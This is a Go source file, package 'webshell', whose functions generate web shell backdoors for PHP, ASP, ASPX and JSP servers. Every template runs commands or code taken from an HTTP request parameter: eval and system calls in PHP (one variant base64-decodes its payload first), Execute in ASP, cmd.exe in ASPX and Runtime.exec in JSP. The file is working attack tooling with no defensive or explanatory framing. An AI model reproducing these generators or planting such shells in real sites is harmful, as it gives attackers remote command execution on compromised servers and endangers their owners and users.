package webshell

import "fmt"

type Lang int

const (
	PHP  Lang = iota
	ASP
	ASPX
	JSP
)

func (l Lang) String() string {
	switch l {
	case PHP:
		return "php"
	case ASP:
		return "asp"
	case ASPX:
		return "aspx"
	case JSP:
		return "jsp"
	default:
		return "unknown"
	}
}

func (l Lang) Ext() string {
	switch l {
	case PHP:
		return ".php"
	case ASP:
		return ".asp"
	case ASPX:
		return ".aspx"
	case JSP:
		return ".jsp"
	default:
		return ".txt"
	}
}

func Generate(lang Lang, pass string) string {
	switch lang {
	case PHP:
		return GeneratePHP(pass)
	case ASP:
		return GenerateASP(pass)
	case ASPX:
		return GenerateASPX(pass)
	case JSP:
		return GenerateJSP(pass)
	default:
		return GeneratePHP(pass)
	}
}

func GeneratePHP(pass string) string {
	if pass == "" {
		pass = "pass"
	}
	return fmt.Sprintf("<?php @eval($_POST['%s']);?>", pass)
}

func GeneratePHPCMD(pass string) string {
	if pass == "" {
		pass = "cmd"
	}
	return fmt.Sprintf("<?php system($_REQUEST['%s']);?>", pass)
}

func GeneratePHPFileManager(pass string) string {
	if pass == "" {
		pass = "pass"
	}
	return fmt.Sprintf(`<?php
$cmd = $_POST['%[1]s'];
if (isset($cmd)) {
    if (is_array($cmd)) {
        foreach ($cmd as $k => $v) {
            $$k = $v;
        }
    } else {
        echo shell_exec($cmd);
    }
}
?>`, pass)
}

func GeneratePHPB64(pass string) string {
	if pass == "" {
		pass = "pass"
	}
	return fmt.Sprintf("<?php $c=$_POST['%s'];@eval(base64_decode($c));?>", pass)
}

func GenerateASP(pass string) string {
	if pass == "" {
		pass = "pass"
	}
	return fmt.Sprintf(`<%% 
Dim c : c = Request.Form("%s")
If c <> "" Then
    Execute(c)
End If
%%>`, pass)
}

func GenerateASPX(pass string) string {
	if pass == "" {
		pass = "pass"
	}
	return fmt.Sprintf(`<%%@ Page Language="C#" %%>
<%%@ Import Namespace="System" %%>
<%%@ Import Namespace="System.Diagnostics" %%>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
    string c = Request["%s"];
    if (c != null && c != "") {
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + c;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.Start();
        Response.Write(p.StandardOutput.ReadToEnd());
    }
}
</script>`, pass)
}

func GenerateJSP(pass string) string {
	if pass == "" {
		pass = "pass"
	}
	return fmt.Sprintf(`<%%@ page import="java.io.*" %%>
<%% 
String c = request.getParameter("%s");
if (c != null) {
    Process p = Runtime.getRuntime().exec(c);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) {
        out.println(line);
    }
    br.close();
}
%%>`, pass)
}

func GenerateAll(pass string) map[Lang]string {
	return map[Lang]string{
		PHP:  GeneratePHP(pass),
		ASP:  GenerateASP(pass),
		ASPX: GenerateASPX(pass),
		JSP:  GenerateJSP(pass),
	}
}
